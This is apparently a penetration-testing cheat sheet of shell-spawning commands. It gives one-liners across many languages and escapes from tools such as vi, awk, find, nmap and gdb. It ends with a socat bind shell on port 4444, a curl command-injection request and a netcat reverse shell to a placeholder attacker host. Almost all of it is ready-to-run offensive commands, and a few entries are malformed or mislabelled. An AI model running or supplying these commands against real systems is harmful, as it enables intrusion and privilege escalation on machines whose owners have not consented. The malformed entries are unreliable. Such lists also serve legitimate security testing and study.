### General Shell Spawning Commands:
1. **Python**:  
   ```bash
   python -c 'import pty; pty.spawn("/bin/sh")'
   ```
   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   ```

2. **Bash**:  
   ```bash
   /bin/sh -i
   ```
   ```bash
   /bin/bash -i
   ```

3. **Perl**:  
   ```bash
   perl -e 'exec "/bin/sh";'
   ```
   ```bash
   perl: exec "/bin/sh";
   ```

4. **Ruby**:  
   ```bash
   ruby -e 'exec "/bin/sh"'
   ```

5. **Lua**:  
   ```bash
   lua -e 'os.execute("/bin/sh")'
   ```

6. **Node.js**:  
   ```bash
   require('child_process').spawn('/bin/sh', {stdio: 'inherit'});
   ```

---

### From Interactive Tools or Applications:

1. **IRB (Ruby Interactive Shell)**:  
   ```bash
   exec "/bin/sh"
   ```

2. **VI or VIM**:  
   Command within VI:  
   ```bash
   :!bash
   ```  
   Set the shell to bash and execute:  
   ```bash
   :set shell=/bin/bash
   :shell
   ```

3. **Nmap** (when NSE script functionality is enabled):  
   ```bash
   !sh
   ```

4. **AWK**:  
   ```bash
   awk 'BEGIN {system("/bin/sh")}'
   ```

5. **Find**:  
   ```bash
   find / -exec /bin/sh \;
   ```

6. **PHP**:  
   ```php
   php -r 'system("/bin/sh");'
   ```

---

### Using Lesser-Known Utilities:

1. **Socat** (if installed):  
   ```bash
   socat exec:'sh',pty,stderr,setsid,sigint,sane tcp-listen:4444
   ```

2. **Java**:  
   ```java
   Runtime.getRuntime().exec("/bin/sh");
   ```

3. **GDB** (GNU Debugger):  
   ```bash
   !sh
   ```

---

### Network or HTTP-based Exploits:
1. **Curl Command Injection**:  
   ```bash
   curl -X POST http://<target> -d 'cmd=/bin/sh'
   ```

2. **Netcat** (Reverse Shell):  
   ```bash
   nc -e /bin/sh <attacker_ip> <port>
   ```

